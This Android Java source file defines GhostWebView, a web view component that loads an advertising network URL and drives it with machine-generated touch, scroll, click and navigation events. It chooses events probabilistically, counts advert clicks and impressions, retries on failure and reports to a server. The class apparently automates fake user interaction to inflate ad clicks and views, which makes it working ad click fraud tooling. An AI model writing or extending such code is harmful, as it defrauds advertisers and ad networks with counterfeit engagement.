package com.nicolls.ghostevent.ghost.view;

import android.content.Context;
import android.os.Handler;
import android.util.AttributeSet;
import android.view.MotionEvent;

import com.nicolls.ghostevent.ghost.core.EventBuilder;
import com.nicolls.ghostevent.ghost.core.EventExecutor;
import com.nicolls.ghostevent.ghost.core.IEventHandler;
import com.nicolls.ghostevent.ghost.core.IWebTarget;
import com.nicolls.ghostevent.ghost.core.RedirectHandler;
import com.nicolls.ghostevent.ghost.core.ViewEventHandler;
import com.nicolls.ghostevent.ghost.event.BaseEvent;
import com.nicolls.ghostevent.ghost.parse.ParseManager;
import com.nicolls.ghostevent.ghost.request.EventReporter;
import com.nicolls.ghostevent.ghost.request.IEventReport;
import com.nicolls.ghostevent.ghost.utils.Constants;
import com.nicolls.ghostevent.ghost.utils.GhostUtils;
import com.nicolls.ghostevent.ghost.utils.LogUtil;
import com.nicolls.ghostevent.ghost.utils.Probability;

import java.util.concurrent.Executor;
import java.util.concurrent.ExecutorService;

/**
 * author:mengjiankang
 * date:2018/11/21
 * <p>
 * </p>
 */
public class GhostWebView extends BaseWebView implements IWebTarget {
    private static final String TAG = "GhostWebView";
    private int tryTimes = 0;
    private boolean isRetrying = false;
    private final IEventReport eventReport = EventReporter.getInstance();
    private final EventExecutor.ExecuteCallBack executeCallBack = new EventExecutor.ExecuteCallBack() {
        @Override
        public void onSuccess(BaseEvent event) {
            LogUtil.d(TAG, "onSuccess " + event.getName());
            if (event.getParent() == null) {
                LogUtil.d(TAG, "an individual event ");
                BaseEvent generateEvent = probability.generateEvent(GhostWebView.this, webViewClient.getCurrentUrl());
                if (generateEvent == null) {
                    LogUtil.d(TAG, "generate stop ,advert click count:" + probability.getAdvertClickCount()
                            + " advert show count:" + probability.getAdvertShowCount());
                    if (ghostEventCallBack != null) {
                        ghostEventCallBack.onDone();
                    }
                    return;
                }
                eventExecutor.execute(generateEvent);
            }
        }

        @Override
        public void onFail(BaseEvent event) {
            LogUtil.d(TAG, "onFail");
            retry();
        }

        @Override
        public void onTimeOut(BaseEvent event) {
            LogUtil.d(TAG, "onTimeOut");
            retry();
        }
    };

    public interface GhostEventCallBack {
        void onDone();
    }

    private GhostEventCallBack ghostEventCallBack;
    private final IEventHandler eventHandler = new ViewEventHandler(this);
    private EventExecutor eventExecutor = new EventExecutor(eventHandler);
    private final RedirectHandler redirectHandler = new RedirectHandler();
    private final EventBuilder eventBuilder = new EventBuilder(getContext(), redirectHandler, executeCallBack);
    private Probability probability;
    private GhostWebViewTriggerEvent ghostWebViewTriggerEvent;
    private GhostWebViewClient webViewClient;

    public GhostWebView(Context context) {
        super(context);
        init();
    }

    public GhostWebView(Context context, AttributeSet attrs) {
        super(context, attrs);
        init();
    }

    public GhostWebView(Context context, AttributeSet attrs, int defStyleAttr) {
        super(context, attrs, defStyleAttr);
        init();
    }

    private void init() {
        eventExecutor.setExecuteCallBack(executeCallBack);
        setWebChromeClient(new GhostWebChromeClient());
        webViewClient = new GhostWebViewClient(this, redirectHandler);
        setWebViewClient(webViewClient);
        ghostWebViewTriggerEvent = new GhostWebViewTriggerEvent(this, redirectHandler, executeCallBack);
        setOnTouchListener(ghostWebViewTriggerEvent);
        probability = new Probability(eventBuilder);
        ParseManager.getInstance().init(this);
    }

    public void setGhostEventCallBack(GhostEventCallBack callBack) {
        ghostEventCallBack = callBack;
    }

    /**
     * 开始
     */
    public void start() {
        String url = GhostUtils.getParamsAdvertUrl(Constants.DEFAULT_UNION_URL);
        probability.init();
        LogUtil.d(TAG, "start url " + url);
        LogUtil.d(TAG, "start load ", true);
        EventReporter.getInstance().uploadEvent(Constants.EVENT_TYPE_LOAD_UNION_URL);
        eventExecutor.execute(eventBuilder.getLoadPageEvent(this, url));
    }

    /**
     * 停止
     */
    public void stop() {
        LogUtil.d(TAG, "stop");
        try {
            eventExecutor.shutDown(new BaseEvent.EventCallBack() {
                @Override
                public void onComplete() {
                    LogUtil.d(TAG, "stop shut down onComplete");
                    eventHandler.quit();
                    eventBuilder.quit();
                }

                @Override
                public void onFail(Exception e) {
                    LogUtil.d(TAG, "stop shut down onFail");
                    eventHandler.quit();
                    eventBuilder.quit();
                }
            });
        } catch (Exception e) {
            LogUtil.e(TAG, "stop error ", e);
        }
    }

    /**
     * 测试
     */
    public void test() {
        LogUtil.d(TAG, "test");
//        GhostUtils.Page page=GhostUtils.currentPage(webViewClient.getCurrentUrl());
//        if (page== GhostUtils.Page.SECOND_NEWS){
//            eventExecutor.execute(eventBuilder.getSecondNewsSelectClickEvent(this, ViewNode.Type.NEWS));
//        }else {
//            eventExecutor.execute(eventBuilder.getHomeSelectClickEvent(this, ViewNode.Type.NEWS));
//        }
    }

    /**
     * 返回
     */
    public void back() {
        LogUtil.d(TAG, "back");
        eventExecutor.execute(eventBuilder.getGoBackEvent(this));
    }

    /**
     * 重试
     */

    private void retry() {
        try {
            tryTimes++;
            LogUtil.d(TAG, "retry times:" + tryTimes);
            if (tryTimes > Constants.MAX_TRY_TIMES) {
                LogUtil.d(TAG, "tryTimes>MAX_TRY_TIMES");
                if (ghostEventCallBack != null) {
                    ghostEventCallBack.onDone();
                }
                return;
            }

            if (isRetrying) {
                LogUtil.d(TAG, "retrying...");
                return;
            }
            isRetrying = true;
            eventReport.uploadEvent(Constants.EVENT_TYPE_RETRY);
            eventExecutor.reset(new BaseEvent.EventCallBack() {
                @Override
                public void onComplete() {
                    LogUtil.d(TAG, "reset completed");
                    isRetrying = false;
                    start();
                }

                @Override
                public void onFail(Exception e) {
                    LogUtil.d(TAG, "shutdown onError");
                    if (ghostEventCallBack != null) {
                        ghostEventCallBack.onDone();
                    }
                }
            });
        } catch (Exception e) {
            LogUtil.e(TAG, "retry error ", e);
            if (ghostEventCallBack != null) {
                ghostEventCallBack.onDone();
            }
        }
    }

    @Override
    public Handler getMainHandler() {
        return eventHandler.getMainHandler();
    }

    @Override
    public Handler getEventHandler() {
        return eventHandler.getEventHandler();
    }

    @Override
    public ExecutorService getEventTaskPool() {
        return eventHandler.getEventTaskPool();
    }

    @Override
    public void doEvent(MotionEvent event) {
        eventHandler.doEvent(event);
    }


    @Override
    public void executeJs(String js) {
        LogUtil.d(TAG, "executeJs " + js);
        loadUrl(js);
    }

    @Override
    protected void onScrollChanged(int l, int t, int oldl, int oldt) {
        super.onScrollChanged(l, t, oldl, oldt);
        ghostWebViewTriggerEvent.onScrollChanged(l, t, oldl, oldt);
    }

    public void onScrollStateChanged(ScrollState state) {
        LogUtil.d(TAG, "onScrollStateChanged " + state);
    }

}
